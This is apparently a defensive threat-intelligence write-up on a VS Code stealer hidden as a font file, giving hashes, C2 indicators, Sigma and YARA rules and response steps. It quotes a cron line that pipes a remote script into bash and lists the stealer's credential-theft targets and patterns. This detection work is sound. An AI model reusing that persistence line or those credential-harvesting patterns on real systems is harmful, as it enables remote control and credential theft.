# GhostAction stage 2 (fake-font VS Code stealer) — IOCs and starter detections

Campaign: GhostAction's October 2026 evolution. Stage 1 pushes a fake
"security audit" GitHub Actions workflow (since Oct 8); stage 2 commits
`.vscode/tasks.json` + `public/fonts/fa-solid-400.woff2` — a hidden VS Code
task labeled `eslint-check` with `runOn: folderOpen` executes 38 lines of
unobfuscated Node.js disguised as a font file, steals credentials, POSTs them
to `193.32.204.199:8080`, and installs a cron job (`#ghc2`) that fetches and
runs attacker commands every 5 minutes.
Scope: 94 repos / 66 owners; stage 2 confirmed in all 79 clonable repos.
Primary source: OpenSourceMalware deep-dive, Oct 16, 2026
(https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file).
Discovery credit: Thijs Xhaflaire (Jamf Threat Labs), hunting PolinRider.
OpenSourceMalware labels this a PolinRider *copycat*, not a DPRK extension —
no shared IOCs with known DPRK malware.

Cross-campaign note: this `.vscode/tasks.json` folderOpen persistence is now a
pattern, not a one-off. Threadlinqs TL-2026-3729 (Oct 16) documents ChainDrop
using the same `.vscode/tasks.json` folderOpen persistence, and the Oct 8
TraderTraitor-linked Terraform provider hid payloads as `.woff` files. Weight
the behavioral rules below over the hashes.

ATT&CK mapping: T1053.003 (Scheduled Task/Job: Cron), T1552.001 (Credentials in
Files), T1555 (Credentials from Password Stores), T1005 (Data from Local
System), T1119 (Automated Collection), T1071.001 (Web Protocols), T1059.004
(Unix Shell: curl|bash), T1041 (Exfiltration Over C2 Channel).

## Indicators of compromise

```
# Fake-font stealer SHA-256 (fa-solid-400.woff2, by batch tag)
cb3842832267421b9563c7bd32d3582a8fff624860e57c2c9058966735d4da60   # ?c=reinject
61eca87b4b4c3e6248dc0fde25ff9cf28637798a8c4be172eaef9843252d12f6   # ?c=auto_20261015
92dec8f50d934c338ff3c1bcbf1c9b028aa9561128d0077a101a1ef4dac0f0db   # ?c=auto_20261014

# Launcher (byte-identical across all 79 repos analyzed)
a043f03e89ef55779f4f630138cf5efe1dd37632e176c7a0d9bbfa989ba84eeb   # .vscode/tasks.json

# Stage-1 / stage-2 workflows
6d258db70677c99c08c9db37e002751eb0f0fb7c0cab2a4effd7c8fa8d115d19   # security-audit.yml (first version)
d301438d713006a7a63889969fb5a30389c88bba5fbd89ef22becac611823a4f   # security-audit.yml (second version)
40a007874722c46e0d194c4453f6cee26ee9c64513597784cc9c0e8b85471e7c   # lint.yml (reference second-stage workflow)

# Server (single IP is the one indicator that never moved, per OpenSourceMalware)
193.32.204.199

# URLs (defang before sharing)
hxxp://193[.]32[.]204[.]199:8080/?c=reinject
hxxp://193[.]32[.]204[.]199:8080/?c=auto_20261013
hxxp://193[.]32[.]204[.]199:8080/?c=auto_20261014
hxxp://193[.]32[.]204[.]199:8080/?c=auto_20261015
hxxp://193[.]32[.]204[.]199:8080/?c=security
hxxp://193[.]32[.]204[.]199/?c=new
hxxp://193[.]32[.]204[.]199:8080/c2/<hostname>     # cron-fetched script, path keyed by victim hostname

# Markers
eslint-check          # tasks.json task label
DEVBOX                # exfil report header (DEVBOX user=... host=... repo=...)
#ghc2                 # crontab comment on the persistence line

# Second-stage workflow filenames (one of seven, plus cache-cleanup.yml)
lint.yml, ci-check.yml, build-check.yml, repo-health.yml, audit.yml,
code-review.yml, test-suite.yml, cache-cleanup.yml

# Phishing kit OAuth client ID (from OpenSourceMalware's Oct 11 kit write-up,
# cited in the stage-2 remediation guidance)
Ov23ctrqCqZ79UaYKwyq
```

Notes:
- The launcher `tasks.json` is byte-identical everywhere: detection by hash
  is cheap and precise, but the actor can trivially rotate it. Rules 2-4 below
  carry the durable signal.
- Cron persistence line, verbatim pattern:
  `*/5 * * * * curl -s -m 10 http://<server>:8080/c2/$(hostname) | bash >/dev/null 2>&1 #ghc2`
- The stealer's env-var filter is buggy (anchored `^` makes `_API_KEY`/`_TOKEN`
  match only names *starting* with underscore), and its home-dir grep has a
  10s timeout that discards partial results — but the direct file/SSH-key
  reads are unaffected. Don't infer safety from the bugs.
- Stage 2 works without Stage 1 (one repo took stage 2 with no stage 1).
  Two owners were re-hit 6 days after cleaning up stage 1 — access revocation,
  not file deletion, is the fix.

## Sigma rules

### 1. Known GhostAction stage-2 files by hash

```yaml
title: GhostAction Stage 2 Known File Hashes
id: 7c2a4d1e-9f0b-4c5a-b8e3-1d4f2a6c9e01
status: test
description: Detects a file matching one of the 7 GhostAction stage-2 SHA-256 hashes published by OpenSourceMalware (Oct 16, 2026): 3 fake-font stealer variants, the tasks.json launcher, and 3 workflow files.
references:
    - https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file
author: Rumi, from OpenSourceMalware reporting
date: 2026-10-17
tags:
    - attack.t1005
    - attack.t1071.001
logsource:
    category: file_event
detection:
    selection:
        SHA256:
            - 'cb3842832267421b9563c7bd32d3582a8fff624860e57c2c9058966735d4da60'
            - '61eca87b4b4c3e6248dc0fde25ff9cf28637798a8c4be172eaef9843252d12f6'
            - '92dec8f50d934c338ff3c1bcbf1c9b028aa9561128d0077a101a1ef4dac0f0db'
            - 'a043f03e89ef55779f4f630138cf5efe1dd37632e176c7a0d9bbfa989ba84eeb'
            - '6d258db70677c99c08c9db37e002751eb0f0fb7c0cab2a4effd7c8fa8d115d19'
            - 'd301438d713006a7a63889969fb5a30389c88bba5fbd89ef22becac611823a4f'
            - '40a007874722c46e0d194c4453f6cee26ee9c64513597784cc9c0e8b85471e7c'
    condition: selection
falsepositives:
    - None expected; hash-based
level: critical
```

### 2. Behavioral — node executing a font file

The strongest single signal: Node.js does not care about extensions, so the
campaign runs `node ./public/fonts/fa-solid-400.woff2`. Legitimate code never
executes `.woff2` with node.

```yaml
title: Node.js Executing a Font File
id: 3b8e5f2a-4c7d-4e9a-a1b6-8d2f0c4e5a23
status: experimental
description: Detects node/nodejs executing a file with a font extension (.woff2/.woff/.ttf/.otf) — the GhostAction stage-2 execution pattern, also seen in the Oct 8 TraderTraitor-linked trojanized Terraform provider (.woff payloads).
references:
    - https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file
author: Rumi
date: 2026-10-17
tags:
    - attack.t1204
    - attack.t1005
logsource:
    category: process_creation
detection:
    selection_image:
        Image|endswith:
            - '/node'
            - '\node.exe'
            - '/nodejs'
            - '\nodejs.exe'
            - '/bun'
            - '\bun.exe'
    selection_font_exec:
        CommandLine|contains:
            - '.woff2'
            - '.woff '
            - '.woff"'
            - ".woff'"
            - '.ttf'
            - '.otf'
    condition: selection_image and selection_font_exec
falsepositives:
    - Build tooling that passes font assets to node scripts (e.g. bundlers with odd quoting); tune CommandLine matching to your fleet before alerting
level: high
```

### 3. Cron persistence with the #ghc2 marker

```yaml
title: Cron Persistence with GhostAction Marker
id: 9d1c7b3e-2f5a-4d8c-b4e6-5a7f9c1d3e45
status: test
description: Detects the GhostAction stage-2 persistence line — a crontab entry fetching a hostname-keyed script every 5 minutes, tagged #ghc2. Deleting repo files does not remove this; the host keeps taking orders.
references:
    - https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file
author: Rumi
date: 2026-10-17
tags:
    - attack.t1053.003
    - attack.t1071.001
logsource:
    category: process_creation
    product: linux
detection:
    selection_marker:
        CommandLine|contains: 'ghc2'
    selection_crontab:
        CommandLine|contains:
            - 'crontab'
    selection_c2_path:
        CommandLine|contains: '/c2/'
    condition: selection_marker and (selection_crontab or selection_c2_path)
falsepositives:
    - None expected; ghc2 is a campaign-specific marker
level: critical
```

Hunt one-liner for fleet sweep (macOS/Linux): `crontab -l 2>/dev/null | grep ghc2`.

### 4. Egress to GhostAction infrastructure

```yaml
title: Outbound Connection to GhostAction Server
id: 6a4d8c2f-1b3e-4e7a-9c5d-2f8e6b4a1c73
status: test
description: Detects outbound traffic to the GhostAction server IP on port 8080, or HTTP requests carrying the campaign's batch-tag query markers. The IP is the one indicator that never moved through the campaign's October evolution.
references:
    - https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file
author: Rumi, from OpenSourceMalware reporting
date: 2026-10-17
tags:
    - attack.t1071.001
    - attack.t1041
logsource:
    category: proxy
detection:
    selection_ip:
        dst_ip: '193.32.204.199'
    selection_port:
        dst_port: 8080
    selection_batch_tags:
        c-uri-query|contains:
            - 'c=reinject'
            - 'c=auto_20'
            - 'c=security'
            - 'c=new'
            - 'c=monami'
    condition: selection_ip or (selection_port and selection_batch_tags)
falsepositives:
    - Port-8080 traffic with similar query tags on unrelated hosts; confirm against the IP before treating as a hit
level: high
```

### 5. Suspicious VS Code folderOpen task launching a font asset (hunt rule)

```yaml
title: VS Code folderOpen Task Pointing at Font Asset
id: 4f7a2d9c-8e1b-4a3d-b6e5-1c9f3d5a7b21
status: experimental
description: Hunt rule for .vscode/tasks.json files combining a folderOpen trigger with a font-asset execution target — the launcher pattern shared by GhostAction stage 2, PolinRider, and ChainDrop's documented persistence. Requires file-content visibility (EDR file-modify with content or repo scanning).
references:
    - https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file
author: Rumi
date: 2026-10-17
tags:
    - attack.t1547
    - attack.t1053
logsource:
    category: file_event
detection:
    selection_tasks_json:
        TargetFilename|endswith: '.vscode\tasks.json'
    keywords:
        - 'folderOpen'
        - 'eslint-check'
        - '.woff2'
    condition: selection_tasks_json and keywords
falsepositives:
    - Legitimate folderOpen tasks that reference font assets (rare; review hits manually)
level: medium
```

## YARA rule — fake-font Node.js stealer

Detects the campaign's distinctive shape: a file pretending to be a font
(missing the `wOF2` magic) containing the stealer's plain-JS markers. Catches
renamed/tag-rotated variants the hashes miss.

```yara
rule GhostAction_FakeFont_Stealer {
    meta:
        description = "GhostAction stage 2 fake-font credential stealer (Oct 2026) - Node.js payload in non-font file"
        author = "Rumi, from OpenSourceMalware reporting"
        date = "2026-10-17"
        reference = "https://opensourcemalware.com/blog/ghostaction-copycats-polinrider-by-hiding-a-stealer-in-a-fake-font-file"
        hash_reinject = "cb3842832267421b9563c7bd32d3582a8fff624860e57c2c9058966735d4da60"
        hash_auto_20261015 = "61eca87b4b4c3e6248dc0fde25ff9cf28637798a8c4be172eaef9843252d12f6"
        hash_auto_20261014 = "92dec8f50d934c338ff3c1bcbf1c9b028aa9561128d0077a101a1ef4dac0f0db"
    strings:
        $s1 = "var os, fs, cp;" ascii
        $s2 = "os.homedir()" ascii
        $s3 = "DEVBOX user=" ascii
        $s4 = "#ghc2" ascii
        $s5 = "193.32.204.199" ascii
        $s6 = "/?c=reinject" ascii
        $s7 = "grep -rhoE 'A[KS]IA[0-9A-Z]{16}" ascii
        $s8 = "require('child_process')" ascii
        $s9 = "/c2/$(hostname)" ascii
        $cred1 = ".claude/.credentials.json" ascii
        $cred2 = ".gemini/oauth_creds.json" ascii
        $cred3 = ".kube/config" ascii
    condition:
        filesize < 20KB
        and uint32(0) != 0x57324F46  // not a real WOFF2 ("wOF2" magic)
        and 4 of ($s*)
        and 1 of ($cred*)
}
```

## Response notes

1. **Revoke access before cleaning files.** Two owners in this set were
   re-hit 6 days after deleting the stage-1 workflow. Revoke every GitHub
   session, PAT, OAuth authorization (incl. client ID
   `Ov23ctrqCqZ79UaYKwyq`), GitHub App installation, SSH and deploy keys —
   from a clean device — then rotate. Deleting files doesn't revoke tokens.
2. **Hunt the laptop, not just the repo:** `crontab -l | grep ghc2`,
   `.vscode/tasks.json` with `eslint-check`, any text file named like a font
   under `public/fonts`, and (for the PolinRider-crossover case) config files
   ending in a whitespace-padded JS block.
3. **Execution caveat:** cloning is not compromise — the workspace must be
   trusted AND VS Code automatic tasks permitted. No cron persistence exists
   on Windows (the theft runs, the job doesn't install).
4. **Rotate from a clean device, after containment:** SSH keys, cloud creds,
   npm/PyPI tokens, GitHub tokens, kubeconfig, Anthropic/OpenAI/Gemini
   logins. If the cron entry was present, the server has had a 5-minute
   command loop — rebuild, don't trust cleanup.
5. **Shai-Hulud dead-man's-switch lesson applies in spirit:** neutralize
   persistence first, rotate second.
